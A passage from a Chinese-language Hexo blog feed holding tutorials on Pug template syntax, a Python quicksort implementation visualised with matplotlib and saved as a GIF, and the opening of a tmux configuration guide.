    &lt;p&gt;Hellow, world!&lt;/p&gt;
    &lt;p&gt;Hello, pug.&lt;/p&gt;
&lt;/div&gt;
</code></pre>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>pug</code>使用<code>//-</code>或<code>//</code>对代码进行注释，前者注释内容不出现在渲染后的<code>html</code>文件中，后者反之。</p>
<pre><code class="pug">//- html中不包含此行
// html中会包含此行
</code></pre>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p><code>pug</code>将标签属性存放于括号<code>()</code>内，多个属性之间以逗号或空格分隔。此外，对于标签的<code>id</code>和<code>class</code>，<code>pug</code>使用<code>#</code>紧跟标签<code>id</code>,使用<code>.</code>紧跟标签<code>class</code>，可以同时设置多个<code>class</code>。</p>
<pre><code class="pug">h1#title Test title
img#name.class1.class2(src=&quot;/test.png&quot; alt=&quot;test&quot;)
</code></pre>
<p>↓</p>
<pre><code class="html">&lt;h1 id=&quot;title&quot;&gt;Test title&lt;/h1&gt;
&lt;img id=&quot;name&quot; class=&quot;class1 class2&quot; src=&quot;/test.png&quot; alt=&quot;test&quot;&gt;
</code></pre>
<h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><p>为了方便代码复用，<code>pug</code>提供了<code>include</code>包含功能，以下代码会将<code>_partial</code>目录下的<code>head.pug</code>文件内容包含到当前调用的位置。有点<code>C/C++</code>中内联函数的意思。</p>
<pre><code class="pug">doctype html
html(lang=&#39;en&#39;)
    include _partial/head.pug
</code></pre>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>下面是一个简单的<code>base</code>模板，通过<code>block</code>定义了页面头部<code>head</code>和内容<code>body</code>。块<code>block</code>有点类似<code>C/C++</code>的抽象函数，需要在继承者中完成定义，填充具体内容。</p>
<pre><code class="pug">//- base.pug
html
    head
        block title
    body
        block content
</code></pre>
<p>以下文件使用<code>extends</code>继承以上模板，通过<code>block</code>覆盖或替换原有块<code>block</code>。当然，继承者也可以在原有基础上继续扩展。</p>
<pre><code class="pug">//- index.pug
extends base.pug

block title
    title &quot;Test title&quot;

block content
    h1 Hello world!
    block article
</code></pre>
<h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><p><code>pug</code>中通过<code>- var name = value</code>的形式定义变量</p>
<pre><code class="pug">- var intData = 100
- var boolData = false
- var stringData = &#39;Test&#39;
p.int= intData
p.bool= boolData
p.stringData= stringData
</code></pre>
<blockquote>
<p>需注意的是，在引用变量时，需要在引用位置加上<code>=</code>号，否则会默认将变量名当成普通字符串使用。</p>
</blockquote>
<p>如果想要将变量与其它字符串常量或是变量连接在一起，就不能用等号了，而是应该用<code>#{}</code>，该符号会对大括号内的变量进行求值和转义，最终得到渲染输出的内容。</p>
<pre><code class="pug">- var girl = &#39;Lily&#39;
- var boy = &#39;Jack&#39;
p #{girl} is so beautiful!
p And #{boy} is handsome.
</code></pre>
<h3 id="条件结构"><a href="#条件结构" class="headerlink" title="条件结构"></a>条件结构</h3><p><code>pug</code>的条件语句与其它语言类似，均是如下这般：</p>
<pre><code class="pug">- var A = {value: &#39;Test&#39;}
- var B = true
if A.value
    p= A.value
else if B
    p= B
else
    p nothing
</code></pre>
<h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p><code>pug</code>中使用<code>each</code>和<code>while</code>实现循环迭代，<code>each</code>可以返回当前所在项的索引值，默认从0开始计数。</p>
<pre><code class="pug">//- each
ol
    each item in [&#39;Sun&#39;, &#39;Mon&#39;, &#39;Tus&#39;, &#39;Wen&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;]
        li= item

//- get index of each
- var week = [&#39;Sun&#39;, &#39;Mon&#39;, &#39;Tus&#39;, &#39;Wen&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;]
ol
    each item, index in week
        li= index + &#39;:&#39; + item
</code></pre>
<p>↓</p>
<pre><code class="html">&lt;ol&gt;
  &lt;li&gt;Sun&lt;/li&gt;
  &lt;li&gt;Mon&lt;/li&gt;
  &lt;li&gt;Tus&lt;/li&gt;
  &lt;li&gt;Wen&lt;/li&gt;
  &lt;li&gt;Thu&lt;/li&gt;
  &lt;li&gt;Fri&lt;/li&gt;
  &lt;li&gt;Sat&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
  &lt;li&gt;0:Sun&lt;/li&gt;
  &lt;li&gt;1:Mon&lt;/li&gt;
  &lt;li&gt;2:Tus&lt;/li&gt;
  &lt;li&gt;3:Wen&lt;/li&gt;
  &lt;li&gt;4:Thu&lt;/li&gt;
  &lt;li&gt;5:Fri&lt;/li&gt;
  &lt;li&gt;6:Sat&lt;/li&gt;
&lt;/ol&gt;
</code></pre>
<p><code>while</code>调用方式如下：</p>
<pre><code class="pug">//- while
- var day = 1
ul
    while day &lt; 7
        li= day++
</code></pre>
<h3 id="Minix"><a href="#Minix" class="headerlink" title="Minix"></a>Minix</h3><p><code>mixin</code>名曰<strong>混入</strong>，类似其它编程语言中的<strong>函数</strong>，也是为了代码复用，可带参数或不带参数，定义方式如下：</p>
<pre><code class="pug">mixin menu-item(href, name)
    li
        span.dot ●
        a(href=href)= name
</code></pre>
<p>其中，<code>menu-item</code>为调用时所用名称，可认为是函数名，<code>href</code>及<code>name</code>是参数。同上<a href="#定义变量">定义变量</a>所说，<code>a(href=href)= name</code>中第二个<code>=</code>是为了将后面的<code>name</code>当作参数来处理，而不是当作字符串&quot;name&quot;来处理。</p>
<p>调用<code>mixin</code>定义的代码块，需通过<code>+</code>号紧跟<code>mixin</code>名称及参数:</p>
<pre><code class="pug">+menu-item(&#39;/Archives&#39;,&#39;Archives&#39;)
+menu-item(&#39;/About&#39;,&#39;About&#39;)
</code></pre>
<p><code>mixin</code>之所以称为混入，是因为其语法不局限于函数调用，在<code>mixin</code>可以使用块<code>block</code></p>
<pre><code class="pug">mixin print(post)
    if block
        block
    else
        p= post

+print(&quot;no block&quot;)
+print(&quot;&quot;)
    div.box
        p this is the content of block
</code></pre>
<p>↓</p>
<pre><code class="html">&lt;p&gt;no block&lt;/p&gt;
&lt;div class=&quot;box&quot;&gt;&lt;p&gt;this is the content of block&lt;/p&gt;&lt;/div&gt;
</code></pre>
<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>注意以下<code>pug</code>语句中第一行的<code>.</code>号。</p>
<pre><code class="pug">script(type=&#39;text/javascript&#39;).
    var data = &quot;Test&quot;
    var enable = true
    if enable
        console.log(data)
    else
        console.log(&#39;nothing&#39;)
</code></pre>
<p>↓</p>
<pre><code class="js">&lt;script type=&#39;text/javascript&#39;&gt;
    var data = &quot;Test&quot;
    var enable = true
    if enable
        console.log(data)
    else
        console.log(&#39;nothing&#39;)
&lt;/script&gt;
</code></pre>
<p>对于简单脚本，使用<code>pug</code>尚可，复杂的还是单独写到<code>.js</code>文件中，然后通过<code>pug</code>引用方便一些，引用方式如下：</p>
<pre><code class="pug">script(type=&#39;text/javascript&#39;, src=&#39;/path/to/js&#39;)

//- with hexo function url_for
script(type=&#39;text/javascript&#39;, src=url_for(theme.js) + &#39;/ready.js&#39;)
</code></pre>
<h3 id="hexo-相关"><a href="#hexo-相关" class="headerlink" title="hexo 相关"></a>hexo 相关</h3><p>在<code>hexo</code>主题中使用<code>pug</code>时，可以通过使用<code>hexo</code>提供的全局变量<code>config</code>，<code>theme</code>来分别调用博客根目录下<code>_config.yml</code>文件中的参数以及主题根目录下<code>_config.yml</code>文件中的参数。</p>
<pre><code class="pug">//- blog config
p= config.description

//- theme config
p= theme.title
</code></pre>
<p>当然，<code>pug</code>中可以直接使用<code>hexo</code>提供的其它全局变量及辅助函数，使用方法详见<code>hexo</code>的<a href="https://hexo.io/zh-cn/docs/variables" target="_blank" rel="noopener">文档</a></p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre><code class="pug">//- head.pug
head
    meta(http-equiv=&#39;content-type&#39;, content=&#39;text/html; charset=utf-8&#39;)
    meta(content=&#39;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&#39;, name=&#39;viewport&#39;)
    meta(content=&#39;yes&#39;, name=&#39;apple-mobile-web-app-capable&#39;)
    meta(content=&#39;black-translucent&#39;, name=&#39;apple-mobile-web-app-status-bar-style&#39;)
    meta(content=&#39;telephone=no&#39;, name=&#39;format-detection&#39;)
    meta(name=&#39;description&#39;, content=config.description)
    block title
    link(rel=&#39;stylesheet&#39;, type=&#39;text/css&#39;, href=url_for(theme.css) + &#39;/style.css&#39; + &#39;?v=&#39; + theme.version)
    link(rel=&#39;Shortcut Icon&#39;, type=&#39;image/x-icon&#39;, href=url_for(&#39;favicon.png&#39;))
    script(type=&#39;text/javascript&#39;, src=&#39;//cdn.bootcss.com/jquery/3.3.1/jquery.min.js&#39;)
    block more
</code></pre>
<pre><code class="pug">//- base.pug
doctype html
html(lang=&#39;en&#39;)
    include _partial/head.pug
    block more
        link(rel=&#39;stylesheet&#39;, type=&#39;text/css&#39;, href=url_for(theme.plugins) + &#39;/prettify/doxy.css&#39;)
        script(type=&#39;text/javascript&#39;, src=url_for(theme.js) + &#39;/ready.js&#39; + &#39;?v=&#39; + theme.version, async)

    //- body
    body: #container.box
        .h-wrapper
            include _partial/nav-menu.pug
        // article content
        block content

        include _partial/footer.pug
</code></pre>
<p>其中:</p>
<ul>
<li><code>theme.*</code>为主题配置文件<code>_config.yml</code>中的参数</li>
<li><code>url_for</code>为<code>hexo</code>提供的用于查找资源路径的函数</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>pug</code>提供了包含，继承，Mixin等多种方式用于代码复用，语法简洁易懂，除了初学时需花费一些时间学习各种标点符号的含义外，其它倒也没有太大困难。</p>
<p>当然啦，<code>pug</code>还有许多其它特性，但就我目前使用情况而言，以上这些便已足够。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://pugjs.org/zh-cn/api/getting-started.html" target="_blank" rel="noopener">https://pugjs.org/zh-cn/api/getting-started.html</a></li>
<li><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pug </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python实现快排及其可视化]]></title>
      <url>https://www.litreily.top/2018/07/07/quick-sort/</url>
      <content type="html"><![CDATA[<p>最近装了个<code>Anaconda</code>，准备学习一下数据可视化。本着三天打鱼两天装死的心态，重新抱起崭新的<strong>算法</strong>书，认真学起了快排算法。学完后用<code>Python</code>实现了一遍基本的快排，然后使用<code>matplotlib</code>进行动态绘图，最后使用<code>imageio</code>生成GIF图片。谨以此文以记之！</p>
<h2 id="快排基本原理"><a href="#快排基本原理" class="headerlink" title="快排基本原理"></a>快排基本原理</h2><p><strong>快排</strong>采用和归并排序相同的分而治之的思想，将待排序数组分成左右两个子数组，对两部分子数组独立排序。当子数组均有序时，整个数组也就有序了。</p>
<p>排序步骤如下：</p>
<ol>
<li>将原始数组<code>data</code>随机打乱，以消除对输入的依赖（本步可选）</li>
<li>选择数组的首个元素<code>data[0]</code>作为切分元素<code>v</code></li>
<li>切分数组<ul>
<li>从左往右找到第一个大于切分元素<code>v</code>的元素<code>data[i]</code></li>
<li>从右到左找到第一个小于切分元素<code>v</code>的元素<code>data[j]</code></li>
<li>交换<code>data[i]</code>与<code>data[j]</code></li>
<li>重复以上三步直到<code>i&gt;=j</code></li>
<li>交换<code>data[j]</code>与切分元素<code>data[0]</code></li>
</ul>
</li>
<li>递归调用，对切分后的左侧子数组进行排序</li>
<li>递归调用，对切分后的右侧子数组进行排序</li>
</ol>
<p>文字性的描述总是那么苍白无力，但还好也能说明一些问题。可以看出，快排的关键在于<strong>切分</strong>，切分后的数组应该满足：</p>
<ol>
<li>切分元素的位置（设为<code>j</code>）已经固定</li>
<li><code>data[lo]</code>到<code>data[j-1]</code>区间内的元素均不大于切分元素<code>data[j]</code></li>
<li><code>data[j+1]</code>到<code>data[hi]</code>区间内的元素均不小于切分元素<code>data[j]</code></li>
</ol>
<p>其中<code>data[lo]</code>代表数组或子数组的首个元素，<code>data[hi]</code>代表数组或子数组的末尾元素。</p>
<p>简单点说，就是先找一个参考点，把小于这个参考点的元素都扔到它的左边，大于这个参考点的数都扔到它的右边。这样一来，参考点的位置就固定了，然后对左边的数据和右边的数据各自再递归的扔几遍，等所有子数组都扔完了，整个数组也就有序了。</p>
<p>不过需要注意的是，扔的时候不是随便扔，是把从左往右找到的第一个大于参考点的值和从右往左找到的第一个小于参考点的值进行替换。</p>
<h2 id="基本实现"><a href="#基本实现" class="headerlink" title="基本实现"></a>基本实现</h2><blockquote>
<p>Talk is cheap, show me the code</p>
</blockquote>
<pre><code class="python">def sort(data):
    __sort(data, 0, len(data) - 1)

def __sort(data, lo, hi):
    if lo &gt;= hi:
        return
    key = __partition(data, lo, hi)
    __sort(data, lo, key - 1)
    __sort(data, key + 1, hi)

def __swap(data, lo, hi):
    data[lo], data[hi] = data[hi], data[lo]

def __partition(data, lo, hi):
    &#39;&#39;&#39;partition array&#39;&#39;&#39;
    i = lo
    j = hi
    v = data[lo] # slicing element
    while True:
        # find one element that larger than v scan from left to right(→)
        i += 1
        while data[i] &lt; v:
            if i == hi:
                break
            i += 1

        # find one element that smaller than v scan from right to left(←)
        while v &lt; data[j]:
            if j == lo:
                break
            j -= 1

        if i &gt;= j:
            break
        __swap(data, i, j)
    __swap(data, lo, j)
    return j
</code></pre>
<p>以上便是参考<code>Algorithms</code>书上<code>java</code>代码的<code>Python</code>实现。下面是个使用示例：</p>
<pre><code class="python">import random

def main():
    data = [_ for _ in range(20)]
    random.shuffle(data)
    print(data)
    sort(data)
    print(data)

if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<p>执行结果如下：</p>
<pre><code class="bash">$ python quick.py
[4, 9, 1, 13, 18, 5, 6, 14, 2, 16, 7, 12, 15, 8, 11, 17, 0, 19, 10, 3]
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]
</code></pre>
<h2 id="快排优化"><a href="#快排优化" class="headerlink" title="快排优化"></a>快排优化</h2><p>快排有很多优化算法，目前我只习得一种最简单的，可以将切分函数两个内部<code>while</code>循环中的<code>if</code>语句去掉</p>
<pre><code class="python"># first one
if i == hi:
    break

# second one
if j == lo:
    break
</code></pre>
<p>这两个判断都是为了防止访问数组越界而设，其实第二个是完全没有必要加的，因为<code>lo</code>对应的就是切分元素本身，自己肯定不会小于自己，所以这个判断完全是多余的；对于第一个，想要去掉的话，只要保证数组最后一个元素最大即可，实现上只要在执行排序函数之前将最大值换至最后即可。</p>
<pre><code class="py">__swap(data, data.index(max(data)), len(data) - 1)
</code></pre>
<p>本文后续的<code>code</code>会将第二个判断去掉，但第一个的还保留着，毕竟把最大值直接挪到最后总感觉怪怪的，在可视化的时候也会牺牲一点随机性。</p>
<h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><p>为了方便代码的阅读和管理,我将快排代码封装成<code>QuickSort</code>类,同时加入变量<code>swap_times</code>用于记录总的数据交换次数。</p>
<pre><code class="py">class QuickSort(object):
    &#39;&#39;&#39;Quick sort algorithm&#39;&#39;&#39;
    def sort(self, data):
        self.swap_times = 0
        # set the largest element to the end
        # self.__swap(data, data.index(max(data)), len(data) - 1)
        self.__sort(data, 0, len(data) - 1)
        return self.swap_times

    def __swap(self, data, lo, hi):
        data[lo], data[hi] = data[hi], data[lo]
        self.swap_times += 1

    def __sort(self, data, lo, hi):
        if lo &gt;= hi:
            return
        key = self.__partition(data, lo, hi)
        self.__sort(data, lo, key - 1)
        self.__sort(data, key + 1, hi)

    def __partition(self, data, lo, hi):
        &#39;&#39;&#39;partition array&#39;&#39;&#39;
        i = lo
        j = hi
        v = data[lo] # slicing element
        while True:
            # find one element that larger than v scan from left to right(→)
            i += 1
            while data[i] &lt; v:
                # below judge can dropped if the end element is the largest
                if i == hi:
                    break
                i += 1

            # find one element that smaller than v scan from right to left(←)
            while v &lt; data[j]:
                j -= 1

            if i &gt;= j:
                break
            self.__swap(data, i, j)
        self.__swap(data, lo, j)
        return j
</code></pre>
<h2 id="打印数据交换记录"><a href="#打印数据交换记录" class="headerlink" title="打印数据交换记录"></a>打印数据交换记录</h2><p>为了了解排序过程中数据交换,可以在<code>__swap</code>函数中打印每一次交换后的数组。</p>
<pre><code class="py">def __init__(self, debug=False, save_fig=False):
    self.debug = debug

def __swap(self, data, lo, hi):
    data[lo], data[hi] = data[hi], data[lo]
    self.swap_times += 1

    if self.debug:
        print(&#39;{0} swap({1}, {2})&#39;.format(data, lo, hi))
</code></pre>
<p>示例：</p>
<pre><code class="py">#main.py
def main():
    data = []
    random.seed(time.time())
    data = [_ for _ in range(20)]
    random.shuffle(data)

    qs = QuickSort(debug=True)
    swap_times, = qs.sort(data)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
<pre><code class="sh">➜  algorithm git:(master) ✗ ./main.py
[14, 3, 11, 10, 4, 1, 2, 12, 18, 17, 7, 8, 13, 15, 0, 9, 16, 6, 5, 19] swap(4, 19)
[14, 3, 11, 10, 4, 1, 2, 12, 5, 17, 7, 8, 13, 15, 0, 9, 16, 6, 18, 19] swap(8, 18)
[14, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 15, 0, 9, 16, 17, 18, 19] swap(9, 17)
[14, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 0, 15, 16, 17, 18, 19] swap(13, 15)
[0, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(0, 14)
[0, 3, 11, 10, 4, 1, 2, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(0, 0)
[0, 3, 2, 10, 4, 1, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(2, 6)
[0, 3, 2, 1, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(3, 5)
[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(1, 3)
[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(1, 1)
[0, 1, 2, 3, 4, 10, 11, 12, 5, 6, 7, 8, 13, 9, 14, 15, 16, 17, 18, 19] swap(4, 4)
[0, 1, 2, 3, 4, 10, 9, 12, 5, 6, 7, 8, 13, 11, 14, 15, 16, 17, 18, 19] swap(6, 13)
[0, 1, 2, 3, 4, 10, 9, 8, 5, 6, 7, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(7, 11)
[0, 1, 2, 3, 4, 7, 9, 8, 5, 6, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 10)
[0, 1, 2, 3, 4, 7, 6, 8, 5, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(6, 9)
[0, 1, 2, 3, 4, 7, 6, 5, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(7, 8)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 7)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(5, 5)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 13, 11, 14, 15, 16, 17, 18, 19] swap(8, 8)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19] swap(12, 13)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(11, 12)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(15, 15)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(16, 16)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(17, 17)
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19] swap(18, 18)
</code></pre>
<p>根据打印结果可以逐步分析快排算法的执行过程，明确知晓每一次交换的数据。</p>
<h2 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h2><p>打印log固然可以分析算法的执行流程，但是不够直观，所以想着用可视化工具进一步处理，以动态图片形式显示快排过程。为此，只需在交换数据的函数<code>__swap</code>中使用<code>matplotlib</code>的柱状图绘制交换完成后的数组即可。</p>
<pre><code class="python">import matplotlib.pyplot as plt
...

class QuickSort(object):
    def __init__(self, debug=False, save_fig=False):
        ...
        self.save_fig = save_fig
        self.fig, self.ax = plt.subplots()
        # open interactive mode of matplot
        plt.ion()

        if self.save_fig:
            self.path = &#39;./images/{0}&#39;.format(time.strftime(&#39;%Y%m%d_%H%M%S&#39;))
            os.makedirs(self.path)

    def __swap(self, data, lo, hi):
        ...
        self.__plot_figure(data, lo, hi, show_swap=True)

    def __plot_figure(self, data, lo=0, hi=0, show_swap=False):
        &#39;&#39;&#39;plot and save figure&#39;&#39;&#39;
        self.ax.clear()
        self.ax.set_title(&#39;data quicksort&#39;)
        self.ax.bar(range(len(data)), data, label=&#39;data&#39;)
        if show_swap:
            self.ax.bar([lo, hi], [data[lo], data[hi]], color=&#39;red&#39;, label=&#39;swap&#39;)
        plt.legend()
        plt.pause(0.001)

        if self.save_fig:
            plt.savefig(&#39;{0}/{1}.png&#39;.format(self.path, self.swap_times))
</code></pre>
<p>需要注意的几点是：</p>
<ol>
<li><code>matplotlib</code>具有两种绘图模式，阻塞(<code>block</code>)模式和交互(<code>interactive</code>)模式，阻塞模式必须等待当前绘图窗口关闭方才执行后续程序，而交互模式则无需等待。为了动态显示排序过程，自然选择交互模式，所以初始化时调用<code>ion()</code>函数打开交互模式</li>
<li>相比于其它样式的图表，使用柱状图<code>bar</code>能够更直观显示数据大小及变化过程</li>
<li>在每次重绘图表时，需要清空原有图表</li>
<li>必须调用<code>pause</code>函数予以等待，否则可能出现无法显示图表的情况，等待时长自定</li>
<li>为了突出显示每次交换的两个数据，可以使用红色图表单独绘制交换数据</li>
<li>使用<code>matplotlib</code>函数库中的<code>savefig</code>可以将图表为至本地图片文件，为后续生成<code>gif</code>图片做准备</li>
</ol>
<p><img src="/assets/algorithm/dataBar.png" alt="data bar"></p>
<h2 id="生成GIF动图"><a href="#生成GIF动图" class="headerlink" title="生成GIF动图"></a>生成GIF动图</h2><p>有了前面保存好的图片，使用<code>imageio</code>库的<code>append</code>函数及<code>mimsave</code>即可生成<code>gif</code>图片。图片间隔时间由<code>mimsave</code>函数的<code>duration</code>参数决定。</p>
<pre><code class="python"># main.py
import imageio
from quick_sort import QuickSort

import os
from os.path import join


def save_gif(path, gif_name):
    if not os.path.exists(path) or len(os.listdir(path))==0:
        return

    images = []
    for file_name in range(len(os.listdir(path))):
        file_path = join(path, &#39;{}.png&#39;.format(file_name))
        images.append(imageio.imread(file_path))
    imageio.mimsave(join(path, gif_name), images, &#39;GIF&#39;, duration=0.2)
</code></pre>
<p><img src="/assets/algorithm/quickSort.gif" alt="quick sort"></p>
<p>至此，便完成了快排的算法实现及其可视化。</p>
<h2 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h2><p>代码已上传至<a href="https://github.com/Litreily/Python-demos.git" target="_blank" rel="noopener">github Python-demos</a> <code>algorithm</code>目录</p>
<ul>
<li>quick_sort.py</li>
</ul>
<pre><code class="python">#!/usr/bin/env python
# -*- coding: utf-8 -*-

import matplotlib.pyplot as plt
import time
import os

class QuickSort(object):
    &#39;&#39;&#39;Quick sort algorithm&#39;&#39;&#39;
    def __init__(self, debug=False, save_fig=False):
        self.debug = debug
        self.save_fig = save_fig
        self.fig, self.ax = plt.subplots()
        plt.ion()

        if self.save_fig:
            self.path = &#39;./images/{0}&#39;.format(time.strftime(&#39;%Y%m%d_%H%M%S&#39;))
            os.makedirs(self.path)

    def sort(self, data):
        self.swap_times = 0
        self.__plot_figure(data)
        # set the largest element to the end
        # self.__swap(data, data.index(max(data)), len(data) - 1)
        self.__sort(data, 0, len(data) - 1)
        return self.swap_times, self.path

    def __swap(self, data, lo, hi):
        data[lo], data[hi] = data[hi], data[lo]
        self.swap_times += 1

        if self.debug:
            print(&#39;\t{0} swap({1}, {2})&#39;.format(data, lo, hi))

        self.__plot_figure(data, lo, hi, show_swap=True)

    def __plot_figure(self, data, lo=0, hi=0, show_swap=False):
        &#39;&#39;&#39;plot and save figure&#39;&#39;&#39;
        self.ax.clear()
        self.ax.set_title(&#39;data quicksort&#39;)
        self.ax.bar(range(len(data)), data, label=&#39;data&#39;)
        if show_swap:
            self.ax.bar([lo, hi], [data[lo], data[hi]], color=&#39;red&#39;, label=&#39;swap&#39;)
        plt.legend()
        plt.pause(0.001)

        if self.save_fig:
            plt.savefig(&#39;{0}/{1}.png&#39;.format(self.path, self.swap_times))

    def __sort(self, data, lo, hi):
        if lo &gt;= hi:
            return
        key = self.__partition(data, lo, hi)
        self.__sort(data, lo, key - 1)
        self.__sort(data, key + 1, hi)

    def __partition(self, data, lo, hi):
        &#39;&#39;&#39;partition array&#39;&#39;&#39;
        i = lo
        j = hi
        v = data[lo] # slicing element
        while True:
            # find one element that larger than v scan from left to right(→)
            i += 1
            while data[i] &lt; v:
                # below judge can dropped if the end element is the largest
                if i == hi:
                    break
                i += 1

            # find one element that smaller than v scan from right to left(←)
            while v &lt; data[j]:
                j -= 1

            if i &gt;= j:
                break
            self.__swap(data, i, j)
        self.__swap(data, lo, j)
        return j

</code></pre>
<ul>
<li>main.py</li>
</ul>
<pre><code class="python">#!/bin/env python
# -*- encoding: utf-8 -*-

import time
import random
import imageio
from quick_sort import QuickSort

import os
from os.path import join


def save_gif(path, gif_name):
    if not os.path.exists(path) or len(os.listdir(path))==0:
        return

    images = []
    for file_name in range(len(os.listdir(path))):
        file_path = join(path, &#39;{}.png&#39;.format(file_name))
        images.append(imageio.imread(file_path))
    imageio.mimsave(join(path, gif_name), images, &#39;GIF&#39;, duration=0.2)


def main():
    data = []
    random.seed(time.time())
    random.shuffle(data)

    print(&#39;source: {0}&#39;.format(data))
    start = time.time()
    qs = QuickSort(debug=False, save_fig=True)
    swap_times, fig_path = qs.sort(data)
    save_gif(fig_path, &#39;quick_sort.gif&#39;)
    stop = time.time()
    print(&#39;result: {0}\n&#39;.format(data))

    print(&#39;----------------------------------&#39;)
    print(&#39;swap times: {0}&#39;.format(swap_times))
    print(&#39;spend time: {0}s&#39;.format(stop - start))
    print(&#39;image path: {0}&#39;.format(fig_path))
    print(&#39;----------------------------------&#39;)


if __name__ == &#39;__main__&#39;:
    main()
</code></pre>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sort </tag>
            
            <tag> visualization </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tmux常用配置说明]]></title>
      <url>https://www.litreily.top/2018/06/19/tmux-config/</url>
      <content type="html"><![CDATA[<p><code>tmux</code>作为<code>Linux</code>三大神器之一，结合<code>zsh</code>和<code>vim</code>堪称无敌，<code>tmux</code>作为分屏利器自有其强大之处，本文就其常用配置予以说明。</p>
<h2 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h2><pre><code class="zsh"># install in ubuntu
$ sudo apt-get install tmux
</code></pre>
<ul>
<li><code>Ctrl+B</code>: default keys of tmux <code>prefix</code></li>
<li><code>.tmux.conf</code>: config file of <code>tmux</code></li>
<li><code>tmux source-file .tmux.conf</code>: command to reload <code>.tmux.conf</code></li>
</ul>
<a id="more"></a>
<h2 id="禁止自动更新窗口名称"><a href="#禁止自动更新窗口名称" class="headerlink" title="禁止自动更新窗口名称"></a>禁止自动更新窗口名称</h2><p>默认情况下，<code>tmux</code>会根据当前目录及相关操作自动更改窗口名称，但通常情况下，我们是不需要其修改的，为此可以在配置文件中添加：</p>
<pre><code class="yml">setw -g allow_rename &#39;off&#39;
</code></pre>
<h2 id="设置zsh作为默认shell"><a href="#设置zsh作为默认shell" class="headerlink" title="设置zsh作为默认shell"></a>设置zsh作为默认shell</h2><p>如果先安装的<code>tmux</code>, 后安装和配置<code>zsh</code>，那tmux有可能默认打开使用的是<code>bash</code>，此时可以使用以下配置指令予以更改：</p>
<pre><code class="yml">set-option -g default-shell /bin/zsh
</code></pre>
<h2 id="设置vim作为默认编辑器"><a href="#设置vim作为默认编辑器" class="headerlink" title="设置vim作为默认编辑器"></a>设置vim作为默认编辑器</h2><p>在<code>tmux</code>的搜索模式<code>prefix+[</code>下，默认使用↑↓←→箭头作为移动按键，对于习惯于<code>vim</code>操作的我来讲，这显然很不方便，还好<code>tmux</code>提供了使用<code>vim</code>作为编辑器的选项，启用配置如下：</p>
<pre><code class="yml">setw -g mode-keys vi
</code></pre>
